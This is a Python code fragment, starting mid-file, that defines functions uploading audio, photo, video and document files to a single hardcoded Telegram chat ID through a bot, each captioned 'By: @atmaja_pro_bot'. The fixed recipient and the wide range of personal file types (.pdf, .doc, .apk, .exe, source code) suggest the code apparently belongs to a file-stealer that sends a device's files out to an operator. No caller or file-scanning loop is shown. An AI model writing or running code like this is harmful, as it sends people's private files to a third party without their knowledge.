...
def send_voice(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".opus",".mp3", ".aac")):
            bot.send_audio(chat_id=401829487, audio=f, caption='By: @atmaja_pro_bot')

def send_phot(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=401829487, photo=f, caption='By: @atmaja_pro_bot')

def send_video(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=401829487, video=f, caption='By: @atmaja_pro_bot')

def send_doc(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id=401829487, document=f, caption='By: @atmaja_pro_bot')
